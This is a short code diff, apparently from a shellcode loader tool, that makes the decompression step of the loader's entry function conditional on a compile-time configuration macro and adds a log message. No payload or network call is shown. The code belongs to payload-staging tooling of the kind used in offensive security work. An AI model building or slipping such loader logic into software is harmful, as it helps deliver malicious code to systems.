@@ -260,7 +260,13 @@ VOID entry(void)
 	}
 #endif
 
-	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
+	// Decompress stage. DecompressShellcode is defined by config.hpp based on
+	// CONFIG_COMPRESSION_TYPE; when type == 0 the macro is undefined and this
+	// block compiles away - no auto-detection, no false positives.
+#ifdef DecompressShellcode
+	DecompressShellcode(&shellcode_ptr, &shellcode_size);
+	LOG_SUCCESS("Decompressed shellcode: %zu bytes", shellcode_size);
+#endif
 
 	if (shellcode_ptr == NULL || shellcode_size == 0)
 	{
